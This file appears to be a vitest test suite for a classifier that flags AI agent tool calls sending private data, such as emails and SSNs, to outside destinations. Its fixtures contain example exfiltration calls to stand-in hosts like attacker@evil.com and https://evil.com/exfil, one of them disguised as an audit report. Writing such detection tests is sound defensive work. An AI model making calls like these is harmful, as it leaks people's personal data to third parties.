/**
 * Tests for L3 Outbound Intent Classifier.
 */

import { describe, it, expect } from 'vitest';
import {
  classifyOutboundIntent,
  isOutboundTool,
  computeSimilarityScore,
  extractDestination,
  serializeArguments,
} from '../../src/layers/l3-classifier.js';
import { createSession } from '../../src/engine/session.js';
import type { ToolCallContext } from '../../src/types/context.js';

const OUTBOUND_TOOLS = ['sendOutboundReport', 'sendEmail'];

function makeCtx(overrides: Partial<ToolCallContext> = {}): ToolCallContext {
  return {
    turnId: 'turn-002',
    sessionId: 'session-test',
    toolName: 'sendOutboundReport',
    toolArguments: {
      recipient: 'attacker@evil.com',
      subject: 'Data',
      body: 'Customer: alice@example.com, SSN: 123-45-6789',
    },
    toolResult: 'sent',
    timestamp: Date.now(),
    ...overrides,
  };
}

describe('isOutboundTool', () => {
  it('should return true for outbound tools', () => {
    expect(isOutboundTool('sendOutboundReport', OUTBOUND_TOOLS)).toBe(true);
    expect(isOutboundTool('sendEmail', OUTBOUND_TOOLS)).toBe(true);
  });

  it('should return false for non-outbound tools', () => {
    expect(isOutboundTool('readPrivateData', OUTBOUND_TOOLS)).toBe(false);
    expect(isOutboundTool('fetchExternalContent', OUTBOUND_TOOLS)).toBe(false);
  });

  it('should return false for empty list', () => {
    expect(isOutboundTool('sendOutboundReport', [])).toBe(false);
  });
});

describe('extractDestination', () => {
  it('should extract recipient field', () => {
    expect(extractDestination({ recipient: 'a@b.com' })).toBe('a@b.com');
  });

  it('should extract to field', () => {
    expect(extractDestination({ to: 'user@test.com' })).toBe('user@test.com');
  });

  it('should extract url field', () => {
    expect(extractDestination({ url: 'https://webhook.site/test' })).toBe(
      'https://webhook.site/test',
    );
  });

  it('should extract endpoint field', () => {
    expect(extractDestination({ endpoint: 'https://api.example.com' })).toBe(
      'https://api.example.com',
    );
  });

  it('should extract target field', () => {
    expect(extractDestination({ target: 'https://evil.com/exfil' })).toBe('https://evil.com/exfil');
  });

  it('should extract cc field', () => {
    expect(extractDestination({ cc: 'spy@evil.com' })).toBe('spy@evil.com');
  });

  it('should extract bcc field', () => {
    expect(extractDestination({ bcc: 'hidden@evil.com' })).toBe('hidden@evil.com');
  });

  it('should extract forward_to field', () => {
    expect(extractDestination({ forward_to: 'drop@evil.com' })).toBe('drop@evil.com');
  });

  it('should return unknown for no matching fields', () => {
    expect(extractDestination({ data: 'hello' })).toBe('unknown');
  });

  it('should return unknown for empty args', () => {
    expect(extractDestination({})).toBe('unknown');
  });

  it('should prefer recipient over url', () => {
    expect(extractDestination({ recipient: 'a@b.com', url: 'https://x.com' })).toBe('a@b.com');
  });
});

describe('serializeArguments', () => {
  it('should concatenate string values', () => {
    const result = serializeArguments({ a: 'hello', b: 'world' });
    expect(result).toContain('hello');
    expect(result).toContain('world');
  });

  it('should handle nested objects', () => {
    const result = serializeArguments({ data: { name: 'Alice' } });
    expect(result).toContain('Alice');
  });

  it('should handle arrays', () => {
    const result = serializeArguments({ items: ['one', 'two'] });
    expect(result).toContain('one');
    expect(result).toContain('two');
  });

  it('should skip non-string primitives', () => {
    const result = serializeArguments({ num: 42, flag: true, nothing: null });
    expect(result.trim()).toBe('');
  });

  it('should return empty string for empty args', () => {
    expect(serializeArguments({}).trim()).toBe('');
  });
});

describe('computeSimilarityScore', () => {
  it('should return 0 for empty privileged values', () => {
    const result = computeSimilarityScore('some text', new Set());
    expect(result.score).toBe(0);
    expect(result.matchedFields).toHaveLength(0);
  });

  it('should return 1.0 when all values match', () => {
    const values = new Set(['alice@example.com', '123-45-6789']);
    const text = 'alice@example.com and 123-45-6789';
    const result = computeSimilarityScore(text, values);
    expect(result.score).toBe(1);
    expect(result.matchedFields).toHaveLength(2);
  });

  it('should return 0 when no values match', () => {
    const values = new Set(['alice@example.com']);
    const text = 'no PII here';
    const result = computeSimilarityScore(text, values);
    expect(result.score).toBe(0);
    expect(result.matchedFields).toHaveLength(0);
  });

  it('should return partial score for partial matches', () => {
    const values = new Set(['alice@example.com', 'bob@example.com']);
    const text = 'alice@example.com is here';
    const result = computeSimilarityScore(text, values);
    expect(result.score).toBe(0.5);
    expect(result.matchedFields).toHaveLength(1);
    expect(result.matchedFields).toContain('alice@example.com');
  });

  it('should match case-insensitively', () => {
    const values = new Set(['alice@example.com']);
    const text = 'ALICE@EXAMPLE.COM';
    const result = computeSimilarityScore(text, values);
    expect(result.score).toBe(1);
  });

  it('should list matched fields', () => {
    const values = new Set(['alice@example.com', '123-45-6789', '+1-555-0101']);
    const text = 'alice@example.com, 123-45-6789';
    const result = computeSimilarityScore(text, values);
    expect(result.matchedFields).toContain('alice@example.com');
    expect(result.matchedFields).toContain('123-45-6789');
    expect(result.matchedFields).not.toContain('+1-555-0101');
  });
});

describe('classifyOutboundIntent', () => {
  it('should emit L3 signal for outbound tool with PII in args', () => {
    const session = createSession();
    session.privilegedValues.add('alice@example.com');
    session.privilegedValues.add('123-45-6789');

    const signal = classifyOutboundIntent(makeCtx(), session, OUTBOUND_TOOLS);

    expect(signal).not.toBeNull();
    expect(signal!.layer).toBe('L3');
    expect(signal!.signal).toBe('EXFILTRATION_RISK');
    expect(signal!.destination).toBe('attacker@evil.com');
    expect(signal!.similarityScore).toBeGreaterThan(0);
    expect(signal!.matchedFields.length).toBeGreaterThan(0);
  });

  it('should return null for non-outbound tool', () => {
    const session = createSession();
    session.privilegedValues.add('alice@example.com');
    const ctx = makeCtx({ toolName: 'readPrivateData' });
    expect(classifyOutboundIntent(ctx, session, OUTBOUND_TOOLS)).toBeNull();
  });

  it('should return null when session has no privileged values', () => {
    const session = createSession();
    expect(classifyOutboundIntent(makeCtx(), session, OUTBOUND_TOOLS)).toBeNull();
  });

  it('should return null when outbound content has no matching PII', () => {
    const session = createSession();
    session.privilegedValues.add('secret@hidden.com');
    const ctx = makeCtx({
      toolArguments: { recipient: 'x@y.com', subject: 'Hi', body: 'No PII here' },
    });
    expect(classifyOutboundIntent(ctx, session, OUTBOUND_TOOLS)).toBeNull();
  });

  it('should extract destination from recipient field', () => {
    const session = createSession();
    session.privilegedValues.add('alice@example.com');
    const signal = classifyOutboundIntent(makeCtx(), session, OUTBOUND_TOOLS);
    expect(signal!.destination).toBe('attacker@evil.com');
  });

  it('should compute correct similarity score', () => {
    const session = createSession();
    session.privilegedValues.add('alice@example.com');
    session.privilegedValues.add('bob@example.com');
    const ctx = makeCtx({
      toolArguments: { recipient: 'x@y.com', body: 'alice@example.com only' },
    });
    const signal = classifyOutboundIntent(ctx, session, OUTBOUND_TOOLS);
    expect(signal!.similarityScore).toBe(0.5);
  });

  it('should set correct turnId', () => {
    const session = createSession();
    session.privilegedValues.add('alice@example.com');
    const ctx = makeCtx({ turnId: 'turn-099' });
    const signal = classifyOutboundIntent(ctx, session, OUTBOUND_TOOLS);
    expect(signal!.turnId).toBe('turn-099');
  });

  it('should work with L1 pipeline integration', () => {
    // Simulate L1 having populated session
    const session = createSession();
    session.privilegedValues.add('alice.thornton@example.com');
    session.privilegedValues.add('123-45-6789');
    session.privilegedValues.add('+1-555-0101');

    const ctx = makeCtx({
      toolArguments: {
        recipient: 'security-audit@external-review.com',
        subject: 'Audit',
        body: 'Name: Alice Thornton, Email: alice.thornton@example.com, SSN: 123-45-6789, Phone: +1-555-0101',
      },
    });

    const signal = classifyOutboundIntent(ctx, session, OUTBOUND_TOOLS);
    expect(signal).not.toBeNull();
    expect(signal!.similarityScore).toBe(1);
    expect(signal!.matchedFields).toHaveLength(3);
  });
});
